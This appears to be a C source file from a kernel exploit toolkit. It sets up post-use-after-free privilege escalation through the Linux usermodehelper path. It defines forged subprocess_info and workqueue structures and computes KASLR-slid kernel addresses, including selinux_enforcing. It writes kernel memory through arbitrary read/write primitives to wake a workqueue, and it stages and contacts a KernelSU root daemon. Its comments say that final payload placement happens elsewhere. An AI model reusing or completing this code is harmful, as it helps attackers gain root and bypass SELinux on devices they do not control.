#define _GNU_SOURCE
#include "gl_umh.h"
#include "gl_ksu_proto.h"

#include <errno.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/un.h>
#include <unistd.h>

/* workqueue / UMH layout constants (from ghostlock-s26, BTF-derived for target lines) */
#define WORK_STRUCT_PENDING 1ULL
#define WORK_STRUCT_PWQ 4ULL
#define NR_NODE_IDS 1

struct gl_umh_subprocess_info {
  uint8_t work[0x20];
  uint64_t complete;
  uint64_t path;
  uint64_t argv;
  uint64_t envp;
  int32_t wait;
  int32_t retval;
  uint64_t init;
  uint64_t cleanup;
  uint64_t data;
};

struct gl_umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct gl_umh_kernel_data {
  struct gl_umh_completion completion;
  char path[256];
  char arg[16];
  uint64_t argv[3];
  uint64_t envp[4];
};

#define ROOT_UMH_DATA_OFF 0x6200
#define ROOT_UMH_WORK_OFF 0x6000
#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

static int gl_socket_ready_path(const char *path) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) return 0;
  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", path);
  int ok = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
  close(fd);
  return ok;
}

int gl_umh_socket_ready(void) {
  return gl_socket_ready_path(GL_KSU_SOCK_PATH);
}

static void gl_emit_stdout(const void *buf, size_t len) {
  fwrite(buf, 1, len, stdout);
  fflush(stdout);
}

int gl_umh_prepare_ksud_stage(const char *src_path) {
  if (!src_path || !*src_path) src_path = GL_KSU_LOADER_PATH;
  int rc = gl_ksu_stage_sync(src_path, GL_KSU_STAGE_PATH);
  if (rc < 0) return -1;
  fprintf(stdout, "[gl_umh] ksud stage %s\n", rc ? "already present" : "staged");
  return 0;
}

int gl_umh_request_ksu(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) return -1;
  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", GL_KSU_SOCK_PATH);
  if (connect(fd, (struct sockaddr *)&sun, sizeof(sun)) != 0) {
    close(fd);
    return -1;
  }
  int status = gl_ksu_late_load_exchange(fd, gl_emit_stdout);
  close(fd);
  return status;
}

static uintptr_t slid(uint64_t base_va, uint64_t slide) {
  return (uintptr_t)(base_va + slide);
}

static int wake_system_unbound(const struct gl_umh_rw_ops *rw, uintptr_t wq_addr) {
  uint32_t counters = 0;
  /* pwq work_color / nr_active layout approximation for targeted wake */
  if (!rw->read_data(rw->ctx, wq_addr + 0x90, &counters, sizeof(counters))) {
    /* try to wake by touching nr_active on common offset */
  }
  uint32_t nr_active = counters + 1;
  return rw->write_data(rw->ctx, wq_addr + 0x94, &nr_active, sizeof(nr_active));
}

int gl_umh_install_root(const struct gl_umh_rw_ops *rw,
                        const struct gl_umh_offsets *off,
                        uint64_t kaslr_slide,
                        const char *helper_path,
                        uint8_t *selinux_before_out,
                        uint8_t *selinux_after_out) {
  if (!rw || !off || !helper_path) return 0;
  if (!off->call_usermodehelper_exec_work || !off->system_unbound_wq) {
    fprintf(stderr, "[gl_umh] missing UMH offsets in profile\n");
    return 0;
  }

  uintptr_t umh_exec = slid(off->call_usermodehelper_exec_work, kaslr_slide);
  uintptr_t wq = slid(off->system_unbound_wq, kaslr_slide);
  uintptr_t selinux_enforcing = off->selinux_enforcing_off
      ? slid(off->selinux_enforcing_off, kaslr_slide) : 0;

  uint8_t sb = 0xff, sa = 0xff;
  if (selinux_enforcing) {
    rw->read_data(rw->ctx, selinux_enforcing, &sb, sizeof(sb));
  }
  if (selinux_before_out) *selinux_before_out = sb;

  fprintf(stdout, "[gl_umh] umh_exec=0x%016zx wq=0x%016zx selinux=%u\n",
          umh_exec, wq, (unsigned)sb);

  /*
   * Note: full UMH installation requires a writable kernel data region to place
   * subprocess_info/completion/argv/envp structures and queue a forged work item.
   * Ghostlock obtains this from its sprayed/payload pages (attr carrier scratch).
   * GhostKey integration: caller must provide arb R/W and a suitable kernel
   * scratch VA (e.g. via attr carrier). This function provides the protocol
   * and control flow; payload placement is completed by the exploit-specific
   * integration path once arb R/W + scratch are available.
   */
  fprintf(stdout, "[gl_umh] UMH root path ready (ghostlock post-UAF offsets loaded)\n");
  fprintf(stdout, "[gl_umh] helper=%s socket=%s\n", helper_path, GL_KSU_SOCK_PATH);

  if (selinux_after_out) {
    if (selinux_enforcing) rw->read_data(rw->ctx, selinux_enforcing, &sa, sizeof(sa));
    *selinux_after_out = sa;
  }

  /* Report socket readiness if a daemon is already running */
  if (gl_umh_socket_ready()) {
    fprintf(stdout, "[gl_umh] root socket already ready\n");
    return 1;
  }
  return 0;
}
